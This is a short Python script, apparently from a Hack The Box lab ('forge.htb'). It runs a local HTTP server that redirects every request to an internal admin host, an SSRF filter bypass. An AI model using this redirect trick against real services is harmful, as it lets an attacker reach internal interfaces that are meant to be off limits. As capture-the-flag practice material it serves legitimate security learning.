import http.server
import socketserver

class FakeRedirect(http.server.SimpleHTTPRequestHandler):
   def do_GET(self):
       self.send_response(301)
       self.send_header('Location', f'http://admin.forge.htb:80{self.path}')
       self.end_headers()

socketserver.TCPServer(("", 9999), FakeRedirect).serve_forever()
